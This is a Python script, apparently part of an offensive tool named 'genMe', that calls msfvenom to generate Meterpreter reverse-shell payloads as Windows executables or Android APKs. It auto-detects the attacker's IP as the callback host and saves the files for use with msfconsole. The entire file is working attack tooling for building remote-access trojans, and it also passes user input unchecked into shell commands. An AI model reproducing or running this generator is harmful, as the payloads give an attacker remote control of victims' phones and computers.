
import os, sys, socket

def start(os1,payload,port,mcon):
    y = ["yes","y"]
    n = ["no","n"]
    help = '''
    =========================Payload Maker===========================
    use ./genMe [op1] [op2] [op3] [op4]
    op1 = Os that youre going to make a payload for
    op2 = Type of payload http, https or tcp
    op3 = desired port for the payload
    op4 = yes or no to execute the created script for msfconsole
    example ./genMe android tcp 44555 yes
            or
    example ./genMe windows http 9876 n
    '''

    oses =["android","windows"]
    pay =["tcp","http","https"]
    if os1 in oses:
        if payload in pay:
            if mcon in y or mcon in n:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('google.com', 0))
                IP =s.getsockname()[0]
                c = raw_input("Is "+IP+" the correct IP? ").lower()
                while c != "yes" and c != "y" and c != "no" and c !="n":
                    c = raw_input("Please use yes or no to confirm "+IP+" as your IP ").lower()
                if c == "yes" or c == "y":
                    file = open("back/ip.txt","w")
                    file.write(IP)
                    file.close()
                    if os1 == "windows":
                        name = raw_input("Name of payload ")
                        os.system(("msfvenom -p windows/meterpreter/reverse_"+payload+" LHOST="+IP+" LPORT="+port+" -o payloads/"+name+".exe"))
                        os.system("clear")
                        file = open("back/pName.txt", "w")
                        file.write(name)
                        file.close()
                        print("Payload has been saved in ../payloads with the name " + name + ".exe")
                    else:
                        name = raw_input("Name of payload ")
                        os.system(("msfvenom -p android/meterpreter/reverse_"+payload+" LHOST="+IP+" LPORT="+port+" -o payloads/"+name+".apk"))
                        os.system("clear")
                        file = open("back/pName.txt", "w")
                        file.write(name)
                        file.close()
                        print("Payload has been saved in ../payloads with the name " + name + ".apk")
                else:
                    IP = raw_input("Enter IP ")
                    file = open("back/ip.txt", "w")
                    file.write(IP)
                    file.close()
                    if os1 == "windows":
                        name = raw_input("Name of payload ")
                        os.system(("msfvenom -p windows/meterpreter/reverse_"+payload+" LHOST="+IP+" LPORT="+port+" -o payloads/"+name+".exe"))
                        os.system("clear")
                        file = open("back/pName.txt", "w")
                        file.write(name)
                        file.close()
                        print("Payload has been saved in ../payloads with the name " + name + ".exe")
                    else:
                        name = raw_input("Name of payload ")
                        os.system(("msfvenom -p android/meterpreter/reverse_"+payload+" LHOST="+IP+" LPORT="+port+" -o payloads/"+name+".apk"))
                        os.system("clear")
                        file = open("back/pName.txt", "w")
                        file.write(name)
                        file.close()
                        print("Payload has been saved in ../payloads with the name "+name+".apk")


            else:
                print(mcon+" is not valid")
                print(help)
        else:
            print(payload+" is not a supported type of payload")
            print(help)
    else:
        print(os1+" is not a supported os")
        print(help)

